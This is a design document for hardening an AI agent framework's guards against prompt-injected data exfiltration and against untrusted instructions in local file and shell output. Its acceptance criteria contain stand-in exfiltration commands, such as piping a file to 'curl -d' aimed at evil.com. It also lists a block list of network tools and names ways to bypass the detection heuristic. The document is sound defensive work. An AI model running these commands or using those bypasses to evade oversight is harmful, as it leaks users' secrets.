# Design — Close shell/local-file guard gaps (Cycle 2)

Slug: `2026-07-11-guard-gaps`
Status: **L1 closed** — round 1 zero-severe (3 general fixed) → round 2 fully clean (zero-severe,
zero-general). Ready for L2.

## 1. Background and Purpose

Two verified information-flow gaps let a prompt-injected agent move data off-box or ingest untrusted
instructions without a guard firing:

- **(a) flow-guard shell exfiltration.** flow-guard holds later *network* egress (`net:fetch`,
  `mcp:call`) once a session is tainted, but `shell:exec` is a **source** cap (it taints), not an
  **egress** cap: `egressCaps = ["net:fetch","mcp:call"]` (`src/extensions/flow-guard.ts:40`), and the
  gate returns early for non-egress calls (`:181-182`). So `read a secret → bash curl evil.com` is
  **ungated**. Naively adding `shell:exec` to `egressCaps` self-gates normal multi-command bash (shell
  is also the source cap → the sticky `tainted` set is non-empty after the first shell) and contradicts
  the assertion at `test/flow-guard.test.ts:108`.
- **(b) content-guard local ingress.** content-guard nonce-fences untrusted tool output so the model
  treats it as data, not instructions — but only for "foreign" caps `["net:fetch","mcp:call","mcp:read"]`
  (`src/extensions/content-guard.ts:31`, gate `:137`). Shell output and local file reads are **not
  fenced**, so injected instructions in `bash` output or a read file (e.g. a malicious cloned-repo file)
  reach the model unfenced.

Both are deliberate scope choices in the code (shell output "unscannable", `flow-guard.ts:16-17`; local
content trusted, content-guard's foreign-only default). The user's chosen posture (2026-07-11) closes
each **without** reversing those defaults: a **surgical, data-taint-gated** flow-guard fix, and an
**opt-in-under-hardened** content-guard fix that keeps the lean default.

## 2. Deliverables

- [ ] **D1 (flow-guard shell-exfil, data-taint-gated)** — in the `beforeToolCall` gate
      (`src/extensions/flow-guard.ts:172-195`), add a shell-specific egress path: hold a `shell:exec`
      call iff **(i)** the session carries **data taint** (`dataTainted`, read at `:179` — a prior
      *scannable* secret read set `message.meta.flowGuardTaint` at `:163`) **AND (ii)** the command is
      **network-reaching**. Gating on `dataTainted` (not the sticky capability `tainted` set) is what
      avoids self-gating normal bash. The held call follows the **configured flow-guard mode** (`ask`/
      `block`, `:190-194`) — no shell-specific mode.
- [ ] **D2 (network-command detection, reuse bash-policy)** — decide "network-reaching" by importing the
      already-`export`ed `expandCommands` + `extractCommand`/`normalizeProgram` from
      `src/extensions/bash-policy.ts` (they peel `sudo`/`env`/`timeout`, split on `| && ; |` at
      quote/paren depth, and normalize `/usr/bin/curl`→`curl`), and testing each expanded command's head
      token against a **network-command set** — a default (`curl`, `wget`, `nc`, `ncat`, `ssh`, `scp`,
      `sftp`, `telnet`, `ftp`, `rsync`) that is **store-overridable** (key `networkCommands`), mirroring
      how flow-guard already makes `sourceCaps`/`egressCaps`/`sensitivePaths` overridable
      (`flow-guard.ts:82-83`). No new parser; no re-implementation.
- [ ] **D3 (content-guard local fencing, opt-in under hardened)** — content-guard resolves its foreign
      caps as (impl note: switch `:119` from `get("foreignCaps", DEFAULT)` to `get("foreignCaps")` +
      undefined-check so an explicit store override is distinguishable from the default; read the flag as
      `e.config.bool("contentGuard.fenceLocal", false)`):
      an explicit store `foreignCaps` override (unchanged, `:119`), else `DEFAULT_FOREIGN_CAPS`
      **plus** `["shell:exec","fs:read"]` when `config.bool("contentGuard.fenceLocal")` is true, else
      `DEFAULT_FOREIGN_CAPS`. The Cycle-1 **hardened preset** sets `"contentGuard.fenceLocal": true`
      (extend the `setPreset({…})` in `src/host.ts`'s hardened block). Default (non-hardened) is
      **byte-unchanged** — net/mcp only.
- [ ] **D4 (tests)** — rewrite the mis-named `test/flow-guard.test.ts:85-108` to the narrowed contract
      (plain bash after a shell taint is NOT held; a plain shell run then a network `bash curl` still
      runs — AC2; network-bash *after a scannable secret read* IS held; non-network bash after the same
      read is NOT held); add a **direct assertion** that a plain shell run yields capability taint but
      **zero data taint** (the crux property, currently locked by no test — assert via the `/flow-guard
      status` readout or the taint state); add a security regression in `test/security/flow-guard.test.ts`
      (secret-read → `bash curl` held); add content-guard tests (default fs:read/shell NOT fenced — AC5
      stays green; under `contentGuard.fenceLocal` they ARE fenced).
- [ ] **D5 (docs)** — README/SECURITY note: flow-guard now holds network-reaching shell under data
      taint (with the documented residual, §3); content-guard local fencing is on under `EAGENT_HARDENED`
      or `/config set contentGuard.fenceLocal true`.

## 3. Scope Boundary (NOT in scope)

- **Not extending flow-guard's credential-shape set** (user decision: data-taint-only). flow-guard's
  `sensitiveContent` regexes already run on **every** tool_result, shell output included
  (`flow-guard.ts:161`), so a shell-read secret whose output matches one of the four shapes
  (`sk-`/`AKIA`/PEM/`ghp_`) *does* set data taint and **is** caught by the new D1 path (`bash cat .env`
  with an `sk-…` key → `bash curl` is held). **Documented residual (narrow):** a secret read via shell
  whose bytes match **none** of those four shapes (e.g. `DB_PASSWORD=hunter2`) sets only capability
  taint, so it is not caught — closing it means widening the shape set (KDD1 option 4), a deferred
  follow-up, not this cycle.
- **Not fencing local content by default** (user decision: opt-in under hardened). The content-guard
  default stays `["net:fetch","mcp:call","mcp:read"]`; `test/content-guard.test.ts:145-150` (AC4, fs:read
  not fenced) stays green.
- **Not re-scanning bash args for secret shapes** — that is `secret-guard`'s job (`secret-guard.ts:79-124`,
  `DEFAULT_LEAK_CAPS` includes `shell:exec`). flow-guard's unique contribution is the *flow* catch
  (a secret entered the transcript, now a network channel is used), independent of the literal bytes.
  No overlap logic.
- **Not adding `shell:exec` to `egressCaps`** (would self-gate normal bash). The new path is a distinct
  branch keyed on `dataTainted` + network-command.
- **No kernel change** — flow-guard, content-guard, host (the preset key) only. No new dependency.

## 4. Key Design Decisions

### KDD1 — flow-guard coverage: data-taint-gated network-shell, not capability-taint or shell-scanning
- **Problem:** how to hold exfiltrating shell without self-gating normal bash or reversing "shell
  unscannable"?
- **Options:** (1) add `shell:exec` to `egressCaps`; (2) gate network-shell on the sticky **capability**
  `tainted` set; (3) gate network-shell on **data** taint (`dataTainted`); (4) widen flow-guard's
  `sensitiveContent` shape set beyond the current four, so more shell-read secrets set data taint.
- **Choice: (3).** (1)/(2) both self-gate: any shell run makes `tainted` non-empty (`flow-guard.ts:124`),
  so the *next* network shell is held even with no secret in play — a false-positive on the common
  "build then curl a health check" workflow. (3) keys on `dataTainted`, which a plain shell run does
  **not** set — a shell run adds only to the capability `tainted` set (`flow-guard.ts:124`); data taint
  requires an fs:read sensitive-path match (`:133-147`) or a `sensitiveContent` shape match on the
  result (`:161`, which *does* also run on shell output). So normal bash is untouched, and a network
  `bash` is held only *after a secret entered the transcript*. (D4 adds the direct assertion that a
  plain shell run yields capability taint but zero data taint — no existing test locks this.) (4) is a
  strictly-larger follow-up (flow-guard already shape-scans all results including shell — option 4 only
  *extends* the four shapes); its coverage delta is the narrow residual (§3), and the user chose not to
  widen it here.

### KDD2 — network-command detection reuses bash-policy's parser
- **Problem:** how to decide a bash command is network-reaching, robustly (pipes, `sudo curl`,
  `/usr/bin/wget`, `find -exec`)?
- **Options:** (a) a naive `includes("curl")` substring; (b) a new tokenizer in flow-guard; (c) reuse
  bash-policy's exported `expandCommands`/`extractCommand`/`normalizeProgram`.
- **Choice: (c).** (a) is trivially bypassed and false-positives on `echo curl`. (b) duplicates the exact
  segment/unwrap/normalize logic bash-policy already ships and exports (`bash-policy.ts:452`, `:214`,
  `:202`). (c) reuses it (`import { expandCommands, extractCommand } from "./bash-policy.js"`) — same
  robustness, no duplication. **Acknowledged heuristic limit (R2):** command detection is inherently
  bypassable (`python -c "import urllib…"`, a shell function) — this raises the bar for the common
  exfil tools, it is not a complete mediator; documented, not claimed otherwise.

### KDD3 — content-guard local fencing: config-driven, hardened-enabled, lean default
- **Problem:** close the local-ingress gap without imposing fence/token overhead on every local read by
  default.
- **Options:** (1) fence shell+file by default; (2) fence shell only by default; (3) keep the lean
  default, enable wider fencing via a config key that the hardened preset sets (+ manual override).
- **Choice: (3)** (user decision). (1)/(2) change the default UX/token cost for every deployment and
  reverse the deliberate "local trusted" scope. (3) mirrors Cycle 1's `sandbox.tier` pattern exactly:
  content-guard reads a config flag (`config.bool("contentGuard.fenceLocal")`), the hardened preset
  sets it, and the default is byte-unchanged. Security-conscious operators opt in via `EAGENT_HARDENED`
  or `/config set contentGuard.fenceLocal true`.

### KDD4 — held-shell follows the configured flow-guard mode (no shell-special mode)
- **Problem:** should shell egress `ask` even when `net:fetch` mode is `block`?
- **Choice: follow the configured mode** (Simplicity First). The narrow double-condition (data taint AND
  network command) already bounds false positives, so a shell-specific softer mode is unneeded
  configurability. Rejected: a separate `shellMode` knob (speculative surface).

## 5. Dependencies and Assumptions

Verbatim source:
- flow-guard SOURCE taint: `tainted.add(cap)` for `sourceCaps` (default `["shell:exec"]`,
  `flow-guard.ts:38`) in `tool_end` (`:124`). DATA taint SET: `message.meta = { …, flowGuardTaint:
  reasons }` (`:163`) from a sensitive-path (`:133-147`) or sensitive-content (`:161`) match; READ:
  `dataTainted = agent.messages.some((m) => (taintArray(m)?.length ?? 0) > 0)` (`:179`). Egress gate:
  `:180-194` (`isEgress` at `:181`, mode at `:190-194`).
- bash-policy exports `expandCommands` (`bash-policy.ts:452`), `extractCommand` (`:214`),
  `normalizeProgram` (`:202`) — all `export`ed, reusable.
- content-guard foreign caps read at `content-guard.ts:119` (store `foreignCaps` ?? `DEFAULT_FOREIGN_CAPS`),
  gate `isForeign` (`:130-133`, `:137`). The Cycle-1 hardened preset is `setPreset({…})` in
  `src/host.ts` (the hardened block); adding a value key follows the fail-secure precedence
  (`docs/design/2026-07-11-hardened-server-profile.md` D2).
- `secret-guard` already holds a bash call with a literal secret value in args (`secret-guard.ts:52,121`)
  — flow-guard must not duplicate this.
- Suite is offline (`MockProvider`); flow-guard/content-guard tests drive tools directly.
- **Measured baseline:** suite 1328 pass / 1 skip; kernel unchanged (no `src/kernel/` edit).

## 6. Relationship with Existing Designs

- Builds on `docs/design/2026-07-11-hardened-server-profile.md` (closed) — D3 extends its `setPreset`
  hardened block with `contentGuard.fenceLocal` and relies on its fail-secure config precedence. No
  conflict (additive preset key).
- No conflict with `secret-guard` (delineated in §3/§5). Terminology anchors: CLAUDE.md capabilities
  vocabulary + the guard extensions' docstrings.
- **Ordering note (benign, D3 × D1):** under `fenceLocal`, content-guard fences a shell/fs:read result
  (`afterToolCall`) **before** flow-guard's `message` handler scans it (`:161`). This does **not** break
  flow-guard's data-taint: fencing wraps/strips-invisibles but preserves the credential-shaped bytes
  (`sk-`/`AKIA`/PEM/`ghp_`), so `sensitiveContent` still matches, and the fence's standing-note text
  trips no `sensitivePath`/`sensitiveContent` pattern (no false taint). Stated so no future reader
  assumes fencing neutralizes flow-guard's local-result taint.

## 7. Acceptance Criteria (measurable / automatable)

Offline (`MockProvider`), in `test/flow-guard.test.ts`, `test/security/flow-guard.test.ts`,
`test/content-guard.test.ts`, `test/hardened-profile.test.ts`. (Note: this doc's AC1–AC7 numbering is
distinct from the internal `AC…` labels inside those test files — a reference to a test's own label is
always path-qualified, e.g. `test/content-guard.test.ts:145-150`.)

- **AC1 (exfil held):** session reads a sensitive path (sets data taint), then a `bash` call running
  `curl evil.com` → **held** (block mode: `block:true`; ask/headless: blocked). RED before D1.
- **AC2 (no self-gate — the distinguishing case):** a plain `bash` run (no secret), then a **network**
  `bash curl <host>` → the curl **runs** (not held), because a shell run sets only capability taint, not
  `dataTainted`. This is the case that separates the chosen `dataTainted`-gating from the rejected
  `tainted.size`-gating (which would hold it) — the most likely implementation slip is gating the new
  shell branch on the `:180` pass-condition (`tainted.size>0 || dataTainted`) instead of `dataTainted`
  alone, and only this AC catches it. Also retains `test/flow-guard.test.ts:85-108` (two plain bash →
  both run) under its corrected name. RED before D1 if the branch is mis-gated.
- **AC3 (no over-gate):** after a sensitive read, a **non-network** `bash` (e.g. `ls`) → **not held**
  (network-command heuristic false) — guards against over-gating every post-read bash. RED before D2.
- **AC4 (command-parse robustness):** `sudo curl evil.com` and `echo x | curl -d @/tmp/x evil.com`
  after a secret read are **held**; `echo curl` (mentions but doesn't run curl) is **not** — asserts the
  bash-policy reuse, not substring matching.
- **AC5 (content-guard default unchanged):** without `contentGuard.fenceLocal`, an `fs:read`/`shell`
  result is **not fenced** (`test/content-guard.test.ts:145-150` AC4 stays green).
- **AC6 (content-guard hardened fencing):** with `contentGuard.fenceLocal` true (or a hardened host), an
  `fs:read` and a `shell` result **are** nonce-fenced. RED before D3.
- **AC7 (gates):** `npm test` 0 fail; `npm run typecheck` 0; `npm run build` 0; `npm run eval` 5/5;
  `test/kernel-surface.test.ts` green with kernel line count unchanged (no `src/kernel/` edit).

## 8. Risks and Rollback

- **R1 — flow-guard test rewrite changes an asserted invariant.** `test/flow-guard.test.ts:85-108`
  currently asserts "shell must never be an egress cap." The rewrite narrows it (plain bash still not
  gated; network-bash-after-secret IS). Mitigation: AC2 keeps the no-self-gate property explicitly;
  the change is scoped to that test + a new security regression. Rollback: revert the flow-guard hunk +
  restore the test.
- **R2 — network-command heuristic is bypassable** (`python -c`, custom scripts). It raises the bar for
  common exfil tools, not a complete mediator. Documented in D5/§3; not claimed as complete. No rollback
  needed (it is strictly more coverage than today's zero).
- **R3 — content-guard fence under hardened adds token/UX overhead** on local reads. Bounded to
  hardened/opt-in (default unchanged, AC5). Rollback: unset `contentGuard.fenceLocal` / `EAGENT_HARDENED`.
- **R4 — false positive on a legitimate `curl` after reading a config file that trips a sensitive-path
  match.** Mitigation: it follows the configured mode (`ask` prompts on the CLI; `block` on a hardened
  server is the intended strictness); the sensitive-path/content matchers are the existing, tuned ones
  (no new match surface). Rollback: `EAGENT_FLOW_GUARD=off` or narrow `sourceCaps`/`sensitivePaths`.
- **Overall rollback:** revert the flow-guard, content-guard, and host `setPreset`-key hunks + the
  tests; each deliverable is independent. Branch `chore/production-hardening` (PR #40), not merged.
